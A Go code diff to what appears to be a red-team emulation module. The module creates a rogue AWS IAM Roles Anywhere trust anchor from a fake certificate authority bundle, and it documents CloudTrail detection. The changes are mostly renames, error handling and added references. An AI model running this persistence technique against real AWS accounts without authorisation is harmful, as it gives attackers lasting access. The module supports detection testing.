@@ -16,7 +16,7 @@ import (
 var trustAnchorName = aws.String("malicious-rolesanywhere-trust-anchor")
 
 //go:embed malicious_externalCertificateBundle.pem
-var maliciousexternalCertificateBundle string
+var maliciousExternalCertificateBundle string
 
 func init() {
 	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
@@ -30,9 +30,14 @@ Warm-up: None.
 Detonation: 
 
 - Create the Trust anchor with a fake Certificate Authority (CA).
+
+References:
+
+- https://docs.aws.amazon.com/rolesanywhere/latest/userguide/trust-model.html
+- https://docs.aws.amazon.com/rolesanywhere/latest/userguide/getting-started.html
 `,
 		Detection: `
-		Identify when a Trust anchor is created, through CloudTrail's <code>CreateTrustAnchor</code> event.
+Identify when a Trust anchor is created, through CloudTrail's <code>CreateTrustAnchor</code> event.
 `,
 		Platform:           stratus.AWS,
 		IsIdempotent:       false, // cannot create twice a Trust anchor with the same name
@@ -43,26 +48,26 @@ Detonation:
 }
 
 func detonate(map[string]string) error {
-	rolesanywhereClient := rolesanywhere.NewFromConfig(providers.AWS().GetConnection())
+	rolesAnywhereClient := rolesanywhere.NewFromConfig(providers.AWS().GetConnection())
 
 	log.Println("Creating a malicious Trust anchor")
-	_, err := rolesanywhereClient.CreateTrustAnchor(context.Background(), &rolesanywhere.CreateTrustAnchorInput{
+	result, err := rolesAnywhereClient.CreateTrustAnchor(context.Background(), &rolesanywhere.CreateTrustAnchorInput{
 		Name: trustAnchorName,
-		Source: &types.Source{ 
+		Source: &types.Source{
 			SourceData: types.SourceData(
-				&types.SourceDataMemberX509CertificateData{Value: maliciousexternalCertificateBundle},
+				&types.SourceDataMemberX509CertificateData{Value: maliciousExternalCertificateBundle},
 			),
-			SourceType: "CERTIFICATE_BUNDLE",
+			SourceType: types.TrustAnchorTypeCertificateBundle,
 		},
 		Tags: []types.Tag{
 			{Key: aws.String("StratusRedTeam"), Value: aws.String("true")},
 		},
 	})
 	if err != nil {
-		return err
+		return errors.New("Unable to create malicious trust anchor: " + err.Error())
 	}
 
-	log.Println("Created malicious Trust anchor " + *trustAnchorName)
+	log.Printf("Created malicious trust anchor %s (%s) \n", *trustAnchorName, *result.TrustAnchor.TrustAnchorArn)
 
 	return nil
 }
